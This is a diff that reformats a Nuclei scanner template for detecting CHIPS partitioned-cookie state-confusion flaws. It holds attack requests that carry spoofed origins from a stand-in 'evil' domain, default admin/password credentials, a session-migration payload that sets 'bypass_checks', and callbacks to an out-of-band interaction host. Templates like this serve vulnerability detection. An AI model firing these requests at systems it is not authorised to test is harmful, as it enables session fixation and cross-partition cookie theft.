@@ -1,162 +1,200 @@
-http:
-- extractors:
-  - group: 1
-    internal: true
-    name: partitioned_cookie
-    part: header
-    regex:
-    - Set-Cookie:\s*([^;]+);.*Partitioned
-    type: regex
-  headers:
-    Accept: text/html,application/xhtml+xml
-    Cookie: __Host-session={{session_token}}; Partitioned; Secure; SameSite=None
-    Sec-CH-UA: '"Chromium";v="118", "Google Chrome";v="118"'
-    Sec-Fetch-Mode: navigate
-    Sec-Fetch-Site: cross-site
-  matchers:
-  - case-insensitive: true
-    condition: or
-    part: header
-    type: word
-    words:
-    - set-cookie
-    - Set-Cookie
-  - condition: or
-    part: header
-    type: word
-    words:
-    - Partitioned
-    - partitioned
-  matchers-condition: and
-  method: GET
-  path:
-  - '{{BaseURL}}/'
-  - '{{BaseURL}}/login'
-  - '{{BaseURL}}/auth'
-  - '{{BaseURL}}/session'
-  - '{{BaseURL}}/api/user'
-- body: "{\n  \"username\": \"admin\",\n  \"password\": \"password\",\n  \"partition_key\"\
-    : \"{{malicious_partition}}\",\n  \"force_partition\": true,\n  \"callback\":\
-    \ \"{{callback_url}}/partition-{{partition_id}}\"\n}\n"
-  headers:
-    Content-Type: application/json
-    Origin: https://{{malicious_partition}}
-    Referer: https://{{malicious_partition}}/evil
-    Sec-Fetch-Site: cross-site
-  matchers:
-  - case-insensitive: true
-    condition: and
-    part: header
-    type: word
-    words:
-    - __Host-
-    - Partitioned
-  method: POST
-  path:
-  - '{{BaseURL}}/auth/login'
-  - '{{BaseURL}}/api/auth'
-  - '{{BaseURL}}/session/create'
-- headers:
-    Accept: application/json
-    Cookie: __Host-session={{session_token}}; Partitioned; Secure; SameSite=None;
-      partition-key=https://{{malicious_partition}}
-    Origin: https://{{malicious_partition}}
-  matchers:
-  - status:
-    - 200
-    type: status
-  - case-insensitive: true
-    condition: or
-    part: body
-    type: word
-    words:
-    - user
-    - profile
-    - session
-  matchers-condition: and
-  method: GET
-  path:
-  - '{{BaseURL}}/api/profile'
-  - '{{BaseURL}}/user/data'
-  - '{{BaseURL}}/session/info'
-- body: "{\n  \"test_partitions\": [\n    \"https://example.com\",\n    \"https://{{malicious_partition}}\"\
-    ,\n    \"null\",\n    \"\",\n    \"*\"\n  ],\n  \"session_token\": \"{{session_token}}\"\
-    ,\n  \"callback_url\": \"{{callback_url}}/chips-test-{{partition_id}}\"\n}\n"
-  headers:
-    Content-Type: application/json
-  matchers:
-  - condition: or
-    part: interactsh_protocol
-    type: word
-    words:
-    - http
-    - dns
-  - part: interactsh_request
-    type: word
-    words:
-    - chips-test-{{partition_id}}
-  matchers-condition: and
-  method: POST
-  path:
-  - '{{BaseURL}}/api/partition/test'
-  - '{{BaseURL}}/cookies/validate'
-- body: "{\n  \"from_partition\": \"https://legitimate.com\",\n  \"to_partition\"\
-    : \"https://{{malicious_partition}}\",\n  \"preserve_state\": true,\n  \"bypass_checks\"\
-    : true\n}\n"
-  extractors:
-  - json:
-    - .new_partition
-    - .session_id
-    - .partition_key
-    type: json
-  headers:
-    Content-Type: application/json
-    Cookie: __Host-session={{session_token}}; Partitioned; Secure
-  matchers:
-  - case-insensitive: true
-    condition: or
-    part: body
-    type: word
-    words:
-    - migration successful
-    - transferred
-    - partition updated
-  - condition: or
-    status:
-    - 200
-    - 302
-    type: status
-  matchers-condition: and
-  method: PUT
-  path:
-  - '{{BaseURL}}/session/migrate'
-  - '{{BaseURL}}/api/session/transfer'
 id: chips-partitioned-cookies-state-confusion
+
 info:
+  name: CHIPS Partitioned Cookies State Confusion Attack
   author: geeknik
+  severity: high
+  description: |
+    Detects state confusion vulnerabilities in CHIPS (Cookies Having Independent
+    Partitioned State) implementations. Tests for cross-partition cookie leakage,
+    partition key bypass, and session fixation through partition manipulation.
+    This is bleeding-edge - almost no security research exists on CHIPS attacks.
+  reference:
+    - https://developer.chrome.com/docs/privacy-sandbox/chips/
+    - https://datatracker.ietf.org/doc/html/draft-cutler-httpbis-partitioned-cookies
+    - https://github.com/privacycg/CHIPS
+    - https://wicg.github.io/CHIPS/
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
     cvss-score: 8.1
     cwe-id: CWE-565,CWE-613,CWE-384
-  description: 'Detects state confusion vulnerabilities in CHIPS (Cookies Having Independent
-
-    Partitioned State) implementations. Tests for cross-partition cookie leakage,
-
-    partition key bypass, and session fixation through partition manipulation.
-
-    This is bleeding-edge - almost no security research exists on CHIPS attacks.
-
-    '
-  name: CHIPS Partitioned Cookies State Confusion Attack
-  reference:
-  - https://developer.chrome.com/docs/privacy-sandbox/chips/
-  - https://datatracker.ietf.org/doc/html/draft-cutler-httpbis-partitioned-cookies
-  - https://github.com/privacycg/CHIPS
-  - https://wicg.github.io/CHIPS/
-  severity: high
   tags: chips,partitioned-cookies,state-confusion,session-fixation,cross-partition
+
 variables:
-  callback_url: '{{interactsh-url}}'
-  malicious_partition: evil.{{randstr}}.com
-  partition_id: '{{randstr}}'
-  session_token: '{{randstr}}'
+  callback_url: "{{interactsh-url}}"
+  partition_id: "{{randstr}}"
+  session_token: "{{randstr}}"
+  malicious_partition: "evil.{{randstr}}.com"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/auth"
+      - "{{BaseURL}}/session"
+      - "{{BaseURL}}/api/user"
+
+    headers:
+      Accept: "text/html,application/xhtml+xml"
+      Sec-CH-UA: '"Chromium";v="118", "Google Chrome";v="118"'
+      Sec-Fetch-Site: "cross-site"
+      Sec-Fetch-Mode: "navigate"
+      Cookie: "__Host-session={{session_token}}; Partitioned; Secure; SameSite=None"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "set-cookie"
+          - "Set-Cookie"
+        condition: or
+        case-insensitive: true
+
+      - type: word
+        part: header
+        words:
+          - "Partitioned"
+          - "partitioned"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: header
+        regex:
+          - "Set-Cookie:\\s*([^;]+);.*Partitioned"
+        group: 1
+        internal: true
+        name: partitioned_cookie
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/auth/login"
+      - "{{BaseURL}}/api/auth"
+      - "{{BaseURL}}/session/create"
+
+    headers:
+      Content-Type: "application/json"
+      Origin: "https://{{malicious_partition}}"
+      Referer: "https://{{malicious_partition}}/evil"
+      Sec-Fetch-Site: "cross-site"
+
+    body: |
+      {
+        "username": "admin",
+        "password": "password",
+        "partition_key": "{{malicious_partition}}",
+        "force_partition": true,
+        "callback": "{{callback_url}}/partition-{{partition_id}}"
+      }
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "__Host-"
+          - "Partitioned"
+        condition: and
+        case-insensitive: true
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/profile"
+      - "{{BaseURL}}/user/data"
+      - "{{BaseURL}}/session/info"
+
+    headers:
+      Accept: "application/json"
+      Cookie: "__Host-session={{session_token}}; Partitioned; Secure; SameSite=None; partition-key=https://{{malicious_partition}}"
+      Origin: "https://{{malicious_partition}}"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "user"
+          - "profile"
+          - "session"
+        condition: or
+        case-insensitive: true
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/partition/test"
+      - "{{BaseURL}}/cookies/validate"
+
+    headers:
+      Content-Type: "application/json"
+
+    body: |
+      {
+        "test_partitions": [
+          "https://example.com",
+          "https://{{malicious_partition}}",
+          "null",
+          "",
+          "*"
+        ],
+        "session_token": "{{session_token}}",
+        "callback_url": "{{callback_url}}/chips-test-{{partition_id}}"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+      - type: word
+        part: interactsh_request
+        words:
+          - "chips-test-{{partition_id}}"
+
+  - method: PUT
+    path:
+      - "{{BaseURL}}/session/migrate"
+      - "{{BaseURL}}/api/session/transfer"
+
+    headers:
+      Content-Type: "application/json"
+      Cookie: "__Host-session={{session_token}}; Partitioned; Secure"
+
+    body: |
+      {
+        "from_partition": "https://legitimate.com",
+        "to_partition": "https://{{malicious_partition}}",
+        "preserve_state": true,
+        "bypass_checks": true
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "migration successful"
+          - "transferred"
+          - "partition updated"
+        condition: or
+        case-insensitive: true
+
+      - type: status
+        status:
+          - 200
+          - 302
+        condition: or
+
+    extractors:
+      - type: json
+        json:
+          - ".new_partition"
+          - ".session_id"
+          - ".partition_key"
